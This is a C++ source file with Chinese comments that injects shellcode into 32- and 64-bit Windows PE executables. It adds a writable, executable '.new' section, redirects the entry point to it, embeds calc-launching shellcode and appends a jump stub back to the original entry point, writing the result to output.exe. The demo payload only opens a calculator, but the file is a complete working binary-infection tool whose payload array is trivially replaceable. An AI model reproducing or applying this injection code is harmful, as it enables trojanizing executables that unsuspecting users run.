/*
    author: ls
	function: 向32or64位程序添加shellcode，弹出计算器
*/
# define _CRT_SECURE_NO_WARNINGS
#include <QtCore/QCoreApplication>
#include <qdebug>
# include <iostream>
# include<windows.h>
# include<winnt.h>
# include <string>
# include "PE.h"

/** 添加新节的步骤
 * 1. 获取节的数目，并且将节的数目加一
 * 2. 添加一个新的节表头、设置节表的属性
 * 3. 根据新加的节表头的VA地址、设置程序的入口点
 * 4. 新增节表（文件末尾） 添加注入的shellcode
 * 5. 在shellcode后面添加jmp指令、转到原始入口点
 * */

int PEInject(PVOID FileAddress, PDWORD FileLength)
{
    int ret = 0;

    FILE* pf = fopen(FILE_PATH, "rb");
    if (pf == NULL)
    {
        ret = -1;
        printf("func fopen() Error: %d\n", ret);
        return ret;
    }
    ret = GetFileLength(pf, FileLength);
    if (ret != 0 && *FileLength == -1)
    {
        ret = -2;
        printf("func GetFileLength() Error!\n");
        return ret;
    }
    // 初始化
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(FileAddress);
    PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)FileAddress + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));

    WORD numberOfSections = pFileHeader->NumberOfSections;
    // 节表数
    pFileHeader->NumberOfSections = pFileHeader->NumberOfSections + 1;

    DWORD AddressOfEntryPoint = pOptionalHeader->AddressOfEntryPoint;

    WORD optionHeaderSize = pFileHeader->SizeOfOptionalHeader;
    // 
    PIMAGE_SECTION_HEADER pimageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + optionHeaderSize);

    PIMAGE_SECTION_HEADER pSection = pimageSectionHeader + numberOfSections - 1;
    //
    DWORD lastSectionSizeInMem;

    // printf("%d", NumberOfSections);
    // 判断???
    if (pSection->SizeOfRawData % pOptionalHeader->SectionAlignment == 0) {
        lastSectionSizeInMem = pSection->SizeOfRawData;
    }
    else {
        lastSectionSizeInMem = ((pSection->SizeOfRawData / pOptionalHeader->SectionAlignment) + 1) * pOptionalHeader->SectionAlignment;
    }
    // 程序入口点
    DWORD NewAddressOfEntryPoint = pSection->VirtualAddress + lastSectionSizeInMem;
    pOptionalHeader->AddressOfEntryPoint = NewAddressOfEntryPoint;
    // shellcode在文件的偏移（最后一个节的文件起始地址+节大小）恰好等于文件原始大小
    // 这个地址就是新节的在文件的起始地址
    DWORD shellcodeInjectAddress = pSection->SizeOfRawData + pSection->PointerToRawData;

    pSection++;// 转到新建节
    // 设置新节的属性
    memset(pSection->Name, 0, 8);
    memcpy((char*)pSection->Name, ".new", 5);

    pSection->Misc.VirtualSize = pOptionalHeader->FileAlignment;
    pSection->VirtualAddress = NewAddressOfEntryPoint;
    pSection->SizeOfRawData = pOptionalHeader->FileAlignment;
    pSection->PointerToRawData = shellcodeInjectAddress;
    // 可读可写可执行
    pSection->Characteristics = 0xE00000E0;
    pOptionalHeader->SizeOfImage = NewAddressOfEntryPoint + pSection->Misc.VirtualSize;

    unsigned char* shell = (unsigned char*)((DWORD)FileAddress + shellcodeInjectAddress);

    char ShellCode[] =
        "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B"
        "\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x3B\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24"
        "\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7";
    // 参考 https://github.com/peterferrie/win-exec-calc-shellcode

    memcpy(shell, ShellCode, strlen(ShellCode));
    shell = shell + strlen(ShellCode);
    // shell 后续的JMP内容
    // \xE8\x00\x00\x00\x00 \x58 \x83\xE8\x4D \x2D\x00\x00\x00\x00 \x05\x00\x00\x00\x00 \xFF\xE0
    // call 0x00000000; 
    // pop eax;
    // 防止字符串被截断
    memcpy(shell, "\xE8\x00\x00\x00\x00\x58", 6);
    shell = shell + 6;

    //sub eax,0x4d [strlen(ShellCode)+5]
    unsigned char cmd_1[] = "\x83\xE8\x4D";
    memcpy(shell, cmd_1, 3);
    shell = shell + 3;

    //sub eax,0x00000000;//
    //add eax,0x00000000;//
    //jmp eax;FFE0
    unsigned char cmd_2[13] = "\x2D\x00\x00\x00\x00\x05\x00\x00\x00\x00\xFF\xE0";
    memcpy(cmd_2 + 1, &NewAddressOfEntryPoint, 4);
    memcpy(cmd_2 + 6, &AddressOfEntryPoint, 4);
    memcpy(shell, cmd_2, 12);

    return ret;
}


int PEInject_64(PVOID FileAddress, PDWORD FileLength)
{
    int ret = 0;

    FILE* pf = fopen(FILE_PATH, "rb");
    if (pf == NULL)
    {
        ret = -1;
        printf("func fopen() Error: %d\n", ret);
        return ret;
    }
    ret = GetFileLength(pf, FileLength);
    if (ret != 0 && *FileLength == -1)
    {
        ret = -2;
        printf("func GetFileLength() Error!\n");
        return ret;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(FileAddress);
    PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)((DWORD)FileAddress + pDosHeader->e_lfanew);;
    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER64 pOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));
    // 节表数
    WORD NumberOfSections = pFileHeader->NumberOfSections;

    pFileHeader->NumberOfSections = pFileHeader->NumberOfSections + 1;
    DWORD addressOfEntryPoint = pOptionalHeader64->AddressOfEntryPoint;

    WORD optionHeaderSize = pFileHeader->SizeOfOptionalHeader;

    PIMAGE_SECTION_HEADER pimageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader64 + optionHeaderSize);
    PIMAGE_SECTION_HEADER pSection = pimageSectionHeader + NumberOfSections - 1;
    // 
    DWORD lastSectionSizeInMem;


    if (pSection->SizeOfRawData % pOptionalHeader64->SectionAlignment == 0) {
        lastSectionSizeInMem = pSection->SizeOfRawData;
    }
    else {
        lastSectionSizeInMem = ((pSection->SizeOfRawData / pOptionalHeader64->SectionAlignment) + 1) * pOptionalHeader64->SectionAlignment;
    }
    // 程序入口点
    DWORD NewAddressOfEntryPoint = pSection->VirtualAddress + lastSectionSizeInMem;
    pOptionalHeader64->AddressOfEntryPoint = NewAddressOfEntryPoint;
    // shellcode在文件的偏移（最后一个节的文件起始地址+节大小）恰好等于文件原始大小
    // 这个地址就是新节的在文件的起始地址
    DWORD shellcodeInjectAddress = pSection->SizeOfRawData + pSection->PointerToRawData;

    pSection++;// 转到新建节
    // 设置新节的属性
    memset(pSection->Name, 0, 8);
    memcpy((char*)pSection->Name, ".new", 5);

    pSection->Misc.VirtualSize = pOptionalHeader64->FileAlignment;
    pSection->VirtualAddress = NewAddressOfEntryPoint;
    pSection->SizeOfRawData = pOptionalHeader64->FileAlignment;
    pSection->PointerToRawData = shellcodeInjectAddress;
    // 可读可写可执行
    pSection->Characteristics = 0xE00000E0;
    pOptionalHeader64->SizeOfImage = NewAddressOfEntryPoint + pSection->Misc.VirtualSize;

    unsigned char* shell = (unsigned char*)((DWORD)FileAddress + shellcodeInjectAddress);

    char ShellCode_64[] =
        "\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x29\xD4\x65\x48\x8B"
        "\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B"
        "\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE"
        "\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57"
        "\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48"
        "\x01\xF7\x99\xFF\xD7";
    //参考 https://github.com/peterferrie/win-exec-calc-shellcode
    //后续jmp "\xE8\x00\x00\x00\x00 \x58 \x48\x83\xE8\x5A \x48\x2D\x44\x33\x22\x11 \x48\x05\x88\x77\x66\x55 \xFF\xE0"

    memcpy(shell, ShellCode_64, strlen(ShellCode_64));
    shell = shell + strlen(ShellCode_64);
    //CALL 	0x00000000; 
    //POP 	rax;
    memcpy(shell, "\xE8\x00\x00\x00\x00\x58", 6);
    shell = shell + 6;
    //SUB  	rax, 0x5A;
    unsigned char cmd_1[] = "\x48\x83\xE8\x5A";//85+5=90  0x5a
    memcpy(shell, cmd_1, 4);
    shell = shell + 4;

    //SUB 	rax, 0x11223344;
    //ADD 	rax, 0x55667788;
    //JMP 	rax;
    unsigned char cmd_2[15] = "\x48\x2D\x44\x33\x22\x11\x48\x05\x88\x77\x66\x55\xFF\xE0";
    memcpy(cmd_2 + 2, &NewAddressOfEntryPoint, 4);
    memcpy(cmd_2 + 8, &addressOfEntryPoint, 4);
    memcpy(shell, cmd_2, 14);

    return ret;
}

int main()
{
    int ret, ret_1;
    PVOID FileAddress = NULL;
    DWORD FileLength = 0;
    char newFile[50] = "C:/Users/ls/Desktop/output.exe";

    //1、将文件读入到内存   
    ret = MyReadFile_V2(&FileAddress, (PCHAR)FILE_PATH);
    if (ret != 0)
    {
        if (FileAddress != NULL)
            free(FileAddress);
        return ret;
    }
    //checkFile
    ret = checkFile(FileAddress);
    if (ret == 32)
    {
        ret_1 = PEInject(FileAddress, &FileLength);
        if (ret_1 != 0)
        {
            if (FileAddress != NULL)
                free(FileAddress);
            return ret_1;
        }
    }
    else if (ret == 64) {
        ret_1 = PEInject_64(FileAddress, &FileLength);
        if (ret_1 != 0)
        {
            if (FileAddress != NULL)
                free(FileAddress);
            return ret_1;
        }
    }
    else {
        if (FileAddress != NULL)
            free(FileAddress);
        return ret;
    }
    //2、
    /*ret = PEInject(FileAddress, &FileLength);
    //printf("%d", FileLength);
    if (ret != 0)
    {
        if (FileAddress != NULL)
            free(FileAddress);
        return ret;
    }

    //2.1
    ret = PEInject_64(FileAddress, &FileLength);
    //printf("%d", FileLength);
    if (ret != 0)
    {
        if (FileAddress != NULL)
            free(FileAddress);
        return ret;
    }*/
    //3、
    ret = MyWriteFile(FileAddress, FileLength + 512, newFile);
    if (ret != 0)
    {
        if (FileAddress != NULL)
            free(FileAddress);
        return ret;
    }
    qDebug() << "Inject success!";

    if (FileAddress != NULL)
        free(FileAddress);

    return 0;
}

